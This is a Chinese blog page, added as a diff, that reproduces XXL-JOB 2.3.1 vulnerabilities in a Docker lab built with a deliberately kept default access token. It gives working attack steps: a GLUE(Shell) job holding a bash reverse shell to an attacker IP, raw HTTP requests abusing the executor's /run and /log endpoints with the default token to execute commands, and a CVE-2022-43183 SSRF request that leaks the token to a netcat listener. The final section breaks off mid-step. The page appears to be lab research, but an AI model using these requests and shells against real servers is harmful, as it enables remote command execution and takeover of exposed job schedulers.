@@ -1,0 +1,928 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yangyanang">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境搭建docker 1234567891011121314# 安装 Dockercurl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun# 启动并设置开机自启systemctl start dockersystemctl enable docker# 安装 docker-compose（V1 版本，兼容性好）curl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxl-job-2.3.1">
+<meta property="og:url" content="http://example.com/2026/10/10/xxl-job-2-3-1/index.html">
+<meta property="og:site_name" content="yangyanang">
+<meta property="og:description" content="环境搭建docker 1234567891011121314# 安装 Dockercurl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun# 启动并设置开机自启systemctl start dockersystemctl enable docker# 安装 docker-compose（V1 版本，兼容性好）curl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/xxl-job.png">
+<meta property="article:published_time" content="2026-10-10T00:51:31.000Z">
+<meta property="article:modified_time" content="2026-10-10T08:14:23.674Z">
+<meta property="article:author" content="yangyanang">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/xxl-job.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>xxl-job-2.3.1 - yangyanang</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":"siteId=23589268","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yangyanang</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/index.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xxl-job-2.3.1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-10-10 08:51" pubdate>
+          2026年10月10日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xxl-job-2.3.1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 Docker</span><br>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun<br><br><span class="hljs-comment"># 启动并设置开机自启</span><br>systemctl start docker<br>systemctl <span class="hljs-built_in">enable</span> docker<br><br><span class="hljs-comment"># 安装 docker-compose（V1 版本，兼容性好）</span><br>curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="hljs-subst">$(uname -s)</span>-<span class="hljs-subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose<br><span class="hljs-built_in">chmod</span> +x /usr/local/bin/docker-compose<br><br><span class="hljs-comment"># 验证</span><br>docker -v<br>docker-compose -v<br></code></pre></td></tr></table></figure>
+
+<p>加速器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/docker<br><br><span class="hljs-built_in">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://docker.xuanyuan.me&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.1ms.run&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.mszx.com&quot;</span><br>  ]<br>&#125;<br>EOF<br><br>systemctl daemon-reload<br>systemctl restart docker<br><br><span class="hljs-comment"># 验证镜像源已生效</span><br>docker info | grep -A 4 <span class="hljs-string">&quot;Registry Mirrors&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /root/xxl-job-quickstart<br><span class="hljs-built_in">cd</span> /root/xxl-job-quickstart<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -L -o tables_xxl_job.sql https://gitee.com/xuxueli0323/xxl-job/raw/2.3.1/doc/db/tables_xxl_job.sql<br><span class="hljs-comment">#curl -L -o tables_xxl_job.sql https://raw.githubusercontent.com/xuxueli/xxl-job/2.3.1/doc/db/tables_xxl_job.sql</span><br><span class="hljs-comment"># 验证：文件应约 6.7K，开头是 # XXL-JOB v2.3.1</span><br><span class="hljs-built_in">ls</span> -lh tables_xxl_job.sql<br><span class="hljs-built_in">head</span> -3 tables_xxl_job.sql<br></code></pre></td></tr></table></figure>
+
+<p>docker-compose.yml</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">cat &gt; docker-compose.yml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>version: <span class="hljs-string">&#x27;3.8&#x27;</span><br><br>services:<br>  mysql:<br>    image: mysql:<span class="hljs-number">5.7</span>.<span class="hljs-number">35</span><br>    container_name: xxl-job-mysql<br>    restart: always<br>    environment:<br>      MYSQL_ROOT_PASSWORD: root_pwd<br>      MYSQL_DATABASE: xxl_job<br>      TZ: Asia/Shanghai<br>    ports:<br>      - <span class="hljs-string">&quot;3306:3306&quot;</span><br>    volumes:<br>      - mysql-data:/var/lib/mysql<br>      - ./tables_xxl_job.sql:/docker-<span class="hljs-keyword">entrypoint</span><span class="language-bash">-initdb.d/tables_xxl_job.sql:ro</span><br>    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci<br>    <span class="hljs-keyword">healthcheck</span><span class="language-bash">:</span><br>      test: [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;mysqladmin&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;-uroot&quot;</span>, <span class="hljs-string">&quot;-proot_pwd&quot;</span>]<br>      timeout: <span class="hljs-number">20</span>s<br>      retries: <span class="hljs-number">10</span><br>    networks:<br>      - xxl-job-network<br><br>  xxl-job-admin:<br>    image: xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span><br>    container_name: xxl-job-admin<br>    restart: always<br>    depends_on:<br>      mysql:<br>        condition: service_healthy<br>    ports:<br>      - <span class="hljs-string">&quot;8080:8080&quot;</span><br>    environment:<br>      PARAMS: &gt;-<br>        --spring.datasource.url=jdbc:mysql://mysql:<span class="hljs-number">3306</span>/xxl_job?useUnicode=true&amp;characterEncoding=UTF-<span class="hljs-number">8</span>&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai<br>        --spring.datasource.username=root<br>        --spring.datasource.password=root_pwd<br>        --xxl.job.accessToken=default_token<br>    volumes:<br>      - ./xxl-job-logs:/data/applogs<br>    networks:<br>      - xxl-job-network<br><br>  xxl-job-executor:<br>    image: chinayin/xxl-job-executor-springboot:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span><br>    container_name: xxl-job-executor<br>    restart: always<br>    depends_on:<br>      - xxl-job-admin<br>    ports:<br>      - <span class="hljs-string">&quot;9999:9999&quot;</span><br>    volumes:<br>      - ./executor.properties:/app/application.properties:ro<br>      - ./xxl-job-executor-logs:/data/applogs<br>    networks:<br>      - xxl-job-network<br><br>volumes:<br>  mysql-data:<br><br>networks:<br>  xxl-job-network:<br>    driver: bridge<br>EOF<br></code></pre></td></tr></table></figure>
+
+<p>配置文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cat &gt; executor.properties &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br><span class="hljs-comment"># 调度中心地址（使用 Docker 服务名）</span><br>xxl.job.admin.<span class="hljs-attribute">addresses</span>=http://xxl-job-admin:8080/xxl-job-admin<br><br><span class="hljs-comment"># 关键：保持默认 Token，这是漏洞复现的前提</span><br>xxl.job.<span class="hljs-attribute">accessToken</span>=default_token<br><br><span class="hljs-comment"># 执行器配置</span><br>xxl.job.executor.<span class="hljs-attribute">appname</span>=xxl-job-executor-sample<br>xxl.job.executor.ip=<br>xxl.job.executor.<span class="hljs-attribute">port</span>=9999<br>xxl.job.executor.<span class="hljs-attribute">logpath</span>=/data/applogs/xxl-job/jobhandler<br>xxl.job.executor.<span class="hljs-attribute">logretentiondays</span>=30<br><br><span class="hljs-comment"># Web 端口改为 8081，避免与 Netty 的 9999 冲突</span><br>server.<span class="hljs-attribute">port</span>=8081<br>EOF<br></code></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 首次启动</span><br>docker<span class="hljs-literal">-compose</span> up <span class="hljs-literal">-d</span><br><br><span class="hljs-comment"># 查看容器状态</span><br>docker<span class="hljs-literal">-compose</span> <span class="hljs-built_in">ps</span><br></code></pre></td></tr></table></figure>
+
+<p>日志</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose logs -f mysql</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table>
+<thead>
+<tr>
+<th align="center">场景</th>
+<th align="center">方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">无法登录后台</td>
+<td align="center">默认token</td>
+</tr>
+<tr>
+<td align="center">能登录后台</td>
+<td align="center">GLUE RCE</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="一、GLUE-RCE（2020）"><a href="#一、GLUE-RCE（2020）" class="headerlink" title="一、GLUE RCE（2020）"></a>一、GLUE RCE（2020）</h3><p>登录后台</p>
+<p>任务管理 新增 运行模式修改为GLUE(Shell) cron填0 0 0 * * ?（随便，反正手动触发），其他任意</p>
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010091341160-1046725985.png" srcset="/img/loading.gif" lazyload alt="image-20261010091338235"></p>
+<p>GLUE IDE编辑</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.10.10.128/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>保存 执行一次</p>
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010091426273-1244433247.png" srcset="/img/loading.gif" lazyload alt="image-20261010091425811"></p>
+<h3 id="二、默认token（2022）"><a href="#二、默认token（2022）" class="headerlink" title="二、默认token（2022）"></a>二、默认token（2022）</h3><p>Host地址为执行器地址</p>
+<p>1、验证默认token</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/beat</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2<br><br><span class="language-dust"><span class="hljs-template-variable">&#123;&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152342782-51158153.png" srcset="/img/loading.gif" lazyload alt="image-20261010152341924"></p>
+<p>2、执行shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/run</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>316<br><br><span class="language-dns">&#123;<span class="hljs-string">&quot;jobId&quot;</span>:<span class="hljs-number">666666</span>,<span class="hljs-string">&quot;executorHandler&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorParams&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorBlockStrategy&quot;</span>:<span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span>,<span class="hljs-string">&quot;executorTimeout&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;logId&quot;</span>:<span class="hljs-number">424242</span>,<span class="hljs-string">&quot;logDateTime&quot;</span>:<span class="hljs-number">1791616810000</span>,<span class="hljs-string">&quot;glueType&quot;</span>:<span class="hljs-string">&quot;GLUE_SHELL&quot;</span>,<span class="hljs-string">&quot;glueSource&quot;</span>:<span class="hljs-string">&quot;#!/bin/bash<span class="hljs-char escape_">\n</span>id;whoami;hostname;uname -a<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;glueUpdatetime&quot;</span>:<span class="hljs-number">1791616810000</span>,<span class="hljs-string">&quot;broadcastIndex&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;broadcastTotal&quot;</span>:<span class="hljs-number">1</span>&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152408784-1246611472.png" srcset="/img/loading.gif" lazyload alt="image-20261010152408242"></p>
+<p>3、读取回显</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;logDateTim&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1791616810000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">424242</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;fromLineNum&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152502246-68005640.png" srcset="/img/loading.gif" lazyload alt="image-20261010152501368"></p>
+<h3 id="三、CVE-2022-43183"><a href="#三、CVE-2022-43183" class="headerlink" title="三、CVE-2022-43183"></a>三、CVE-2022-43183</h3><p>1、登录会话-&gt;获取token</p>
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153226323-453988186.png" srcset="/img/loading.gif" lazyload alt="image-20261010153225785"></p>
+<p>2、攻击机起nc监听</p>
+<p>3、发ssrf请求</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /xxl-job-admin/joblog/logDetailCat?executorAddress=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">10.10.10.128</span>%<span class="hljs-number">3</span>A4545%<span class="hljs-number">2</span>F&amp;triggerTime=<span class="hljs-number">0</span>&amp;logId=<span class="hljs-number">1</span>&amp;fromLineNum=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.130:8080</span><br><span class="hljs-attribute">Cookie</span>: XXL_JOB_LOGIN_IDENTITY=<span class="hljs-number">7</span>b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153550774-1747018953.png" srcset="/img/loading.gif" lazyload alt="image-20261010153550126"></p>
+<p>4、响应数据</p>
+<p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153749198-1346525655.png" srcset="/img/loading.gif" lazyload alt="image-20261010153748320"></p>
+<p>5、拿到XXL-JOB-ACCESS-TOKEN可以使用<code>二、</code>使用调度中心执行命令</p>
+<h3 id="四、-jobinfo-trigger（2026）"><a href="#四、-jobinfo-trigger（2026）" class="headerlink" title="四、&#x2F;jobinfo&#x2F;trigger（2026）"></a>四、&#x2F;jobinfo&#x2F;trigger（2026）</h3><p>1、登录会话-&gt;获取token</p>
+<p>2、攻击机起nc监听</p>
+<p>3、新建GLUE(Shell) </p>
